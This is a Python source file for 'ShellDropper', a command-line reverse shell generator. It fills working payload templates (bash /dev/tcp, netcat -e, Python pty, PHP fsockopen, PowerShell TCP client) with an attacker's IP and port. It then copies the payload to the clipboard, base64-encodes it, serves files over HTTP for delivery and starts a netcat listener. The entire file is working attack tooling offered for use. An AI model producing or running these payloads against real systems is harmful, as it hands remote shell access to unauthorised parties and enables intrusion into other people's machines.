import os
import subprocess
import http.server
import socketserver
import threading
import time
from datetime import datetime
import pyperclip

# Developer Info
DEVELOPER_NAME = "Gaurav Kumar"
GITHUB_ID = "https://github.com/Gaurav5091"

# Payload templates using various languages/tools for reverse shells
payloads = {
    # Linux/Mac payloads
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "netcat": "nc -e /bin/bash {ip} {port}",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",

    # Windows payloads
    "windows_nc": "nc.exe {ip} {port} -e cmd.exe",
    "powershell": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
}

# Starts a basic HTTP server in a separate thread
class SimpleHTTPServerThread(threading.Thread):
    def __init__(self, directory=".", port=8000):
        super().__init__()
        self.directory = directory
        self.port = port

    def run(self):
        os.chdir(self.directory)
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", self.port), handler) as httpd:
            print(f"[+] Hosting HTTP server at http://0.0.0.0:{self.port}/")
            httpd.serve_forever()

def check_port_available(port):
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        return sock.connect_ex(("localhost", int(port))) == 0

def show_header():
    print("\n" + "="*50)
    print("  ShellDropper CLI - Reverse Shell Generator")
    print(f"  Developed by: {DEVELOPER_NAME} ({GITHUB_ID})")
    print("="*50 + "\n")

def get_user_input():
    print("[+] Let's cook a shell!")

    ip = input("[>] Enter your IP (LHOST): ")
    port = input("[>] Enter port to listen on (LPORT): ")

    if check_port_available(port):
        print("[!] Warning: The port you selected appears to be in use.")

    print("\n[+] Choose Shell Type:")
    options = list(payloads.keys())
    for idx, opt in enumerate(options, 1):
        print(f"    {idx}. {opt.title()}")

    choice = int(input("[>] Your choice: ")) - 1
    shell_type = options[choice]

    return ip, port, shell_type

def generate_payload(ip, port, shell_type):
    return payloads[shell_type].format(ip=ip, port=port)

def save_payload_to_file(payload, shell_type):
    filename = f"payload_{shell_type}.txt"
    with open(filename, "w") as f:
        f.write(payload + "\n")
    print(f"[+] Payload saved to {filename}")

def log_payload(payload):
    with open("shelldropper.log", "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {payload}\n")

def start_listener(port):
    print(f"\n[+] Starting listener on port {port}... Press Ctrl+C to stop.")
    try:
        subprocess.run(["nc", "-lvnp", port])
    except KeyboardInterrupt:
        print("\n[!] Listener stopped.")

def base64_encode(payload):
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return encoded

if __name__ == "__main__":
    try:
        show_header()
        ip, port, shell_type = get_user_input()
        shell_cmd = generate_payload(ip, port, shell_type)

        print("\n[+] Here's your reverse shell payload:")
        print("\n\033[92m" + shell_cmd + "\033[0m")

        try:
            pyperclip.copy(shell_cmd)
            print("[+] Payload copied to clipboard!")
        except Exception:
            print("[!] Clipboard copy failed. You may need to install 'xclip' or 'xsel' on Linux.")

        log_payload(shell_cmd)

        save_choice = input("[?] Save payload to a file? [Y/n]: ").strip().lower()
        if save_choice in ["", "y", "yes"]:
            save_payload_to_file(shell_cmd, shell_type)

        b64_choice = input("[?] Want base64 encoded version? [Y/n]: ").strip().lower()
        if b64_choice in ["", "y", "yes"]:
            encoded = base64_encode(shell_cmd)
            print("\n[+] Base64 Encoded Payload:")
            print("\033[94m" + encoded + "\033[0m")

        http_choice = input("[?] Start HTTP server for delivery? [Y/n]: ").strip().lower()
        if http_choice in ["", "y", "yes"]:
            server = SimpleHTTPServerThread()
            server.daemon = True
            server.start()

        start = input("\n[?] Start listener now? [Y/n]: ").strip().lower()
        if start in ["", "y", "yes"]:
            start_listener(port)
        else:
            print("[+] Exiting ShellDropper. Use the payload wisely. \ud83d\udc80")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting ShellDropper.")